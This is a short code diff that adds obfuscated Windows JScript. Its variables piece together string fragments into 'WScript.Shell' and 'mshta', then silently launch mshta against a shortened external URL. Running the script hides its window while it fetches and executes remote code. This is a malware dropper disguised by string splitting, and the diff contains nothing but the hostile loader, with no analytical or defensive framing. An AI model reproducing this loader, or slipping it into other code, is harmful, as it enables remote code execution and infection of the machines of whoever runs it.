@@ -1,0 +1,6 @@
+niglklfj = ("ipt.Shel")
+var rartqneu = WScript.CreateObject("WScr"+niglklfj+"l")
+hmyesapr = ("m")
+ppclndpw = ("sh")
+vrsuoyvj = ("ta ")
+rartqneu.Run((hmyesapr+ppclndpw+vrsuoyvj)+" https://t.ly/uQNF",0)
